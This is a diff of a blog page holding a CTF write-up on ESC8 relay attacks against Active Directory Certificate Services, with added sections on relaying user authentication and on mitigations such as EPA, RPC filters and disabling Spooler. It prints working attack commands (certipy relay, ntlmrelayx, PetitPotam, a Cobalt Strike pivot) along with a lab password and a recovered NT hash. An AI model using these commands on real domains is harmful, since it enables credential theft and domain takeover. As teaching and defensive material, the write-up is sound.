@@ -20,7 +20,7 @@
 {"@context":"https://schema.org","@type":"WebPage","author":{"@type":"Person","name":"Zavier Lee"},"headline":"SINCON CTF 2025","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.png"},"name":"Zavier Lee"},"url":"http://localhost:4000/sincon-2025.html"}</script>
 <!-- End Jekyll SEO tag -->
 
-    <link rel="stylesheet" href="/assets/css/style.css?v=a46ff626144ed2fa561663b711e4e836b094f425">
+    <link rel="stylesheet" href="/assets/css/style.css?v=bc501706390f835e59f7b6761d951f5010e085e4">
     <!--[if lt IE 9]>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
     <![endif]-->
@@ -222,7 +222,7 @@
 
 <p>During <a href="https://www.infosec-city.com/sin-25">SINCON 2025</a>, we sponsored and organized an Active Directory CTF with the <a href="https://www.rangevillage.org/">Range Village</a>. We saw an incredible turnout with nearly 50 people joining us in person, including many newcomers who had never tackled Active Directory challenges before!</p>
 
-<p>This post will provide an overview of the more “challenging” part of the CTF, which involved bypassing <a href="https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/overview?view=powershell-7.5">Just Enough Administration (JEA)</a> and exploiting <a href="https://www.thehacker.recipes/ad/movement/adcs/unsigned-endpoints#web-endpoint-esc8">ESC8</a> from a pivot in a restrictive environment by temporarily unbinding SMB ports without the use of <a href="https://github.com/praetorian-inc/PortBender">PortBender</a>.</p>
+<p>This is the first part of a two-part series that will provide an overview of the more “challenging” part of the CTF, which involved exploiting ESC8 from a pivot in a restrictive environment by temporarily unbinding SMB ports.</p>
 
 <p>[insert img here]</p>
 
@@ -244,9 +244,7 @@
 </ul>
 </li>
 <li>
-<a href="#scriptorium-esc8">Scriptorium - ESC8</a>
-<ul>
-<li><a href="#enumerating-esc8">Enumerating ESC8</a></li>
+<a href="#enumerating-esc8">Enumerating ESC8</a></li>
 <li><a href="#esc8-a-tldr">ESC8, a TLDR</a></li>
 <li><a href="#why-esc8-exists">Why ESC8 Exists</a></li>
 <li>
@@ -271,8 +269,7 @@
 <li><a href="#silver-ticket">Silver Ticket</a></li>
 </ul>
 </li>
-</ul>
-</li>
+<li><a href="#how-about-users">How about Users?</a></li>
 </ol>
 </div>
 </div>
@@ -339,8 +336,6 @@ net localgroup Administrators gatari /add
 
 <p><img src="/assets/img/sincon/bd64132ba6fc0d4ed8b81401bc0e544f.png" alt="" /></p>
 
-<h2 id="scriptorium---esc8">Scriptorium - ESC8</h2>
-
 <p>After obtaining a pivot point at <code class="language-plaintext highlighter-rouge">TABULARIUM</code>, we can use tunnel our traffic through the beacon channel with <code class="language-plaintext highlighter-rouge">socks5</code> to hit <code class="language-plaintext highlighter-rouge">SCRIPTORIUM</code> and <code class="language-plaintext highlighter-rouge">PORTICUS</code>. This is done by setting up a <code class="language-plaintext highlighter-rouge">socks5</code> proxy on the Cobalt Strike beacon:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[05/26 01:23:39] beacon&gt; socks 1081 socks5
@@ -367,7 +362,7 @@ net localgroup Administrators gatari /add
 
 <h2 id="esc8-a-tldr">ESC8, a TLDR</h2>
 
-<p>ESC8 is a vulnerability that is extremely common in many environments, and it boils down to allowing enrollment of certificates through the web endpoint of the Certificate Authority (i.e. <code class="language-plaintext highlighter-rouge">http://palace-dc.jess.kingdom/certsrv</code>). The attack occurs when an attacker is able to “coerce” authentication from a machine, or user and relay their credentials to the web endpoint and obtain either a <code class="language-plaintext highlighter-rouge">User</code> or <code class="language-plaintext highlighter-rouge">Machine</code> certificate.</p>
+<p>ESC8 is a misconfiguration that is extremely common in many environments, and it boils down to allowing enrollment of certificates through the web endpoint of the Certificate Authority (i.e. <code class="language-plaintext highlighter-rouge">http://palace-dc.jess.kingdom/certsrv</code>). The attack occurs when an attacker is able to “coerce” authentication from a machine, or user and relay their credentials to the web endpoint and obtain either a <code class="language-plaintext highlighter-rouge">User</code> or <code class="language-plaintext highlighter-rouge">Machine</code> certificate.</p>
 
 <p><img src="/assets/img/sincon/ESC8.png" alt="" /></p>
 
@@ -375,15 +370,15 @@ net localgroup Administrators gatari /add
 
 <h2 id="why-esc8-exists">Why ESC8 Exists</h2>
 
-<p>If some lightbulb hasn’t gone off yet, the presence of this vulnerability in an environment is usually a sign that domain compromise is soon to follow. This is because SMB authentication coercion is <em>native</em> to Windows, and is not seen as a security risk by Microsoft.</p>
+<p>If some lightbulb hasn’t gone off yet, the presence of this misoncifugration in an environment is usually a sign that domain compromise is soon to follow. This is because SMB authentication coercion is <em>native</em> to Windows, and is not seen as a security risk by Microsoft.</p>
 
-<p>Additionally, the configuration required to enable ESC8 is vulnerable by default when installing <code class="language-plaintext highlighter-rouge">Web Enrollment</code> on the CA server. The following commands were run on a default installation of ADCS to enable the vulnerability:</p>
+<p>Additionally, the configuration required to enable ESC8 is vulnerable by default when installing <code class="language-plaintext highlighter-rouge">Web Enrollment</code> on the CA server. The following commands were run on a default installation of ADCS to enable the misconfiguration:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Install-WindowsFeature -Name ADCS-Web-Enrollment
 Install-AdcsWebEnrollment -Force
 </code></pre></div></div>
 
-<p>Mitigations, and additional caveats will be discussed later, but for now, let’s focus on how to exploit this vulnerability.</p>
+<p>Mitigations, and additional caveats will be discussed later, but for now, let’s focus on how to exploit this misconfiguration.</p>
 
 <h2 id="challenges-in-restricted-environment">Challenges in Restricted Environment</h2>
 
@@ -653,6 +648,155 @@ Impacket v0.13.0.dev0+20250516.105908.a63c652 - Copyright Fortra, LLC and its af
 <p>However, there are some glaring IOCs depending on the tool used to forge the ticket. For example, the ticket that we just forged has an expiration date in <code class="language-plaintext highlighter-rouge">24/05/2035</code>, which is 10 years in the future. Additionally, the ticket is encrypted with <code class="language-plaintext highlighter-rouge">rc4_hmac</code> instead of the domain’s default encryption type, which is <code class="language-plaintext highlighter-rouge">aes256_cts_hmac_sha1_96</code>.</p>
 
 <p>Additionally, the forgery of a silver ticket is only possible if you have the NTLM hash or AES key of the service account. Whereas, the S4U2Self method can be applied in cases where you only have Kerberos authentication as the account, such as during an attack invlving <a href="https://www.silverfort.com/glossary/unconstrained-delegation/">Unconstrained Delegation</a>.</p>
+
+<h3 id="how-about-users">How about Users?</h3>
+
+<p>Similarly, SMB authentication coercion from domain user accounts can also be relayed to web endpoints for the <code class="language-plaintext highlighter-rouge">User</code> certificate template. The process is exactly the same, and you can “simulate” the authentication process by manually authenticating to <code class="language-plaintext highlighter-rouge">TABULARIUM</code>.</p>
+
+<p>This is a common attack path that is often overlooked, the coercion can come in the form of the usual <code class="language-plaintext highlighter-rouge">.lnk</code> files being dropped in global shares. The traditional TTP has been relaying these authentication requests to unsigned SMB endpoints, or cracking them offline.</p>
+
+<p>We’ll also be using <code class="language-plaintext highlighter-rouge">certipy</code> for relaying user authentication, as I’ve had issues getting <code class="language-plaintext highlighter-rouge">ntlmrelayx.py</code> to work in this particular case.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy relay -target 'PALACE-DC.jess.kingdom' -template 'User'
+</code></pre></div></div>
+
+<p><img src="/assets/img/sincon/10a8272479dad8fb8d9de32ee3b00fdf.png" alt="" /></p>
+
+<p>Note that the authentication target shows the CA, as it has been relayed via <code class="language-plaintext highlighter-rouge">TABULARIUM</code> =)</p>
+
+<p><img src="./assets/img/sincon/523cd499c9e1be68d2dc4828eee7132c.png" alt="" /></p>
+
+<p>And similarly to before, we can obtain the NTLM hash of the user account by exchanging the certificate for a TGT:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certipy auth -pfx 'doros_archivon.pfx' -dc-ip '10.3.20.31'                        
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Doros_ARCHIVON@jess.kingdom'
+[*] Using principal: 'doros_archivon@jess.kingdom'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'doros_archivon.ccache'
+[*] Wrote credential cache to 'doros_archivon.ccache'
+[*] Trying to retrieve NT hash for 'doros_archivon'
+[*] Got hash for 'doros_archivon@jess.kingdom': aad3b435b51404eeaad3b435b51404ee:96b5326207a074816bdd447bc7784ad4
+</code></pre></div></div>
+
+<h2 id="mitigations">Mitigations</h2>
+
+<p>In the breaking whitepaper by SpecterOps: <a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">Certified Pre-Owned</a>. It is stated in <code class="language-plaintext highlighter-rouge">PREVENT8</code> that the following mitigations should be applied to prevent the exploitation of ESC8:</p>
+
+<ul>
+  <li>Disable NTLM Authentication</li>
+  <li>Enable HTTPS and Enable Extended Protection for Authentication (EPA)</li>
+</ul>
+
+<p>In most environments, disabling NTLM authentication is not feasible, as it will break many legacy applications that rely on NTLM authentication.</p>
+
+<h3 id="https--epa">HTTPS + EPA</h3>
+
+<p>The second mitigation approach is more practical, however, many individuals incorrectly interpret the “and” requirement as an “or” option. It’s important to recognize that simply implementing and enforcing <code class="language-plaintext highlighter-rouge">TLS</code> by itself will <em>not stop</em> ESC8 exploitation. <code class="language-plaintext highlighter-rouge">Extended Protection for Authentication (EPA)</code> is the security control that actually prevents relaying of NTLM authentication to the CA web endpoint.</p>
+
+<p>Consider the following example, where the <code class="language-plaintext highlighter-rouge">PALACE-DC.jess.kingdom</code> CA web endpoint is configured to use <code class="language-plaintext highlighter-rouge">HTTPS</code> but does not have <code class="language-plaintext highlighter-rouge">EPA</code> enabled. This was configured with reference to the official documentation: <a href="https://learn.microsoft.com/en-us/archive/technet-wiki/12039.active-directory-certificate-services-ad-cs-error-in-order-to-complete-certificate-enrollment-the-web-site-for-the-ca-must-be-configured-to-use-https-authentication">here</a></p>
+
+<p><img src="./assets/img/sincon/85602aefecdf454d6e00f05aae6471bc.png" alt="" /></p>
+
+<p><img src="./assets/img/sincon/10037219e2ce864802b12162215858eb.png" alt="" /></p>
+
+<p>The same attack as before, with a slight modification to the <code class="language-plaintext highlighter-rouge">ntlmrelayx.py</code> command to use <code class="language-plaintext highlighter-rouge">HTTPS</code> instead of <code class="language-plaintext highlighter-rouge">HTTP</code> will still work:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py -t 'https://palace-dc.jess.kingdom/certsrv/certfnsh.asp' -smb2support --adcs --template 'Machine' --no-http-server
+</code></pre></div></div>
+
+<p><img src="./assets/img/sincon/959f03db516b33e4a687951f522b34a5.png" alt="" /></p>
+
+<p>However, after setting “Extended Protection” to “Required” in the CA web enrollment configuration, the same attack will now fail.</p>
+
+<p><img src="./assets/img/sincon/db248008204fea03c92434214b1940cf.png" alt="" /></p>
+
+<h2 id="behind-the-scenes">Behind the Scenes</h2>
+
+<p>As ESC8 is a misconfiguration that I see extremely often in the wild, I really wanted to create a CTF challenge that would allow participants to experience the exploitation of this misconfiguration in a controlled environment - however, due to the nature of the misconfiguration, it’s challenging to include ESC8 in a CTF scenario without enabling participants to completely compromise the entire domain starting from just a basic domain user account.</p>
+
+<p>Since authentication coercion is native to Windows and can’t be effectively patched without significantly disrupting the operating system’s functionality, Microsoft has suggested general mitigations like disabling NTLM authentication and enforcing SMB and LDAP signing.</p>
+
+<p>However, disabling NTLM authentication is extremely difficult to do in practice and SMB/LDAP signing does not prevent relay attacks against web enrollment as HTTP does not support signing NTLM authentication.</p>
+
+<p>The solution that we came up with is:</p>
+<ul>
+  <li>Disabling Spooler Service</li>
+  <li>RPC Filtering</li>
+  <li>Network Segmentation</li>
+</ul>
+
+<h3 id="disabling-spooler-service">Disabling Spooler Service</h3>
+
+<p>If you attempt to perform the attack with another machine, for example: <code class="language-plaintext highlighter-rouge">KNIGHT-HALL.jess.kingdom</code>. You’ll find that <code class="language-plaintext highlighter-rouge">printerbug.py</code> will fail with the following error:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] Attempting to trigger authentication via rprn RPC at KNIGHT-HALL.jess.kingdom
+[-] An unhandled exception has occured. Trying next host:
+[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
+</code></pre></div></div>
+
+<p>This occurs because the <code class="language-plaintext highlighter-rouge">Spooler</code> service is not running on <code class="language-plaintext highlighter-rouge">KNIGHT-HALL</code>, and thus the problematic RPC methods cannot be called.</p>
+
+<p><img src="./assets/img/sincon/ec464b5e9ccf44442a19441eac8ec9d6.png" alt="" /></p>
+
+<h3 id="rpc-filters">RPC Filters</h3>
+
+<p>There are also other authentication coercion methods that rely on RPC, such as <code class="language-plaintext highlighter-rouge">DFSCoerce</code> which relies on <code class="language-plaintext highlighter-rouge">NetrDfsRemoveStdRoot</code> and <code class="language-plaintext highlighter-rouge">NetrDfsAddStdRoot</code> from <code class="language-plaintext highlighter-rouge">MS-DFSNM</code> and <code class="language-plaintext highlighter-rouge">PetitPotam</code> which relies on <code class="language-plaintext highlighter-rouge">EfsRpcOpenFileRaw</code> from <code class="language-plaintext highlighter-rouge">MS-EFSRPC</code>. It is not feasible to simply disable the RPC services, as this would definitely break many applications that rely on RPC for communication.</p>
+
+<p>To mitigate this, we applied an extremely restrictive RPC filter on all domain-joined machines which blocks all inbound RPC requests. In real environments, this rule should be applied with more fine-grained access controls rather than outright blocking all traffic:</p>
+
+<p>For example, consider the following RPC filter rule that blocks all inbound requests with the protocol UUID <code class="language-plaintext highlighter-rouge">c681d488-d850-11d0-8c52-00c04fd90f7e</code>:</p>
+
+<p><img src="./assets/img/sincon/1101b332ea15c35b3c9521939a3ded7d.png" alt="" /></p>
+
+<p>The protocol UUID: <code class="language-plaintext highlighter-rouge">c681d488-d850-11d0-8c52-00c04fd90f7e</code> corresponds to the <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/403c7ae0-1a3a-4e96-8efc-54e79a2cc451"><code class="language-plaintext highlighter-rouge">MS-EFSR</code> protocol</a> which contains a set of RPC methods (<code class="language-plaintext highlighter-rouge">EfsRpcOpenFileRaw</code>, etc.) that can be used to coerce authentication via <code class="language-plaintext highlighter-rouge">EFS</code> - this is meant to prevent <code class="language-plaintext highlighter-rouge">PetitPotam</code>.</p>
+
+<p>Attempting to perform the attack with <code class="language-plaintext highlighter-rouge">KNIGHT-HALL</code> will result in the following error:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains /opt/tools/PetitPotam/PetitPotam.py -d 'jess.kingdom' -u 'Doros_ARCHIVON' -p 'bO3n21E6rc' TABULARIUM.jess.kingdom KNIGHT-HALL.jess.kingdom
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+/opt/tools/PetitPotam/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
+  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
+
+                                                                                               
+              ___            _        _      _        ___            _                     
+             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
+             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
+            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
+          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
+          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
+                                         
+              PoC to elicit machine account authentication via some MS-EFSRPC functions
+                                      by topotam (@topotam77)
+      
+                     Inspired by @tifkin_ &amp; @elad_shamir previous work on MS-RPRN
+
+
+
+Trying pipe lsarpc
+[-] Connecting to ncacn_np:KNIGHT-HALL.jess.kingdom[\PIPE\lsarpc]
+[proxychains] Strict chain  ...  127.0.0.1:1081  ...  10.3.10.11:445  ...  OK
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
+[+] OK! Using unpatched function!
+[-] Sending EfsRpcEncryptFileSrv!
+Something went wrong, check error status =&gt; SMB SessionError: code: 0xc00000b0 - STATUS_PIPE_DISCONNECTED - The specified named pipe is in the disconnected state.
+</code></pre></div></div>
+
+<p>And, no authentication is coerced from <code class="language-plaintext highlighter-rouge">KNIGHT-HALL</code> to <code class="language-plaintext highlighter-rouge">TABULARIUM</code>.</p>
+
+<h3 id="network-segmentation">Network Segmentation</h3>
+
+<p>In order to prevent participants from simply spraying coercion cross the domain, and getting a hit on <code class="language-plaintext highlighter-rouge">SCRIPTORIUM.jess.kingdom</code>, we have placed <code class="language-plaintext highlighter-rouge">SCRIPTORIUM</code> on a separate network segment that is only accessible via <code class="language-plaintext highlighter-rouge">TABULARIUM</code>. This means that participants will minimally need to compromise <code class="language-plaintext highlighter-rouge">TABULARIUM</code> to access <code class="language-plaintext highlighter-rouge">SCRIPTORIUM</code>, which effectively places it as the entrypoint to the second-half of the CTF.</p>
 
 
 <script>
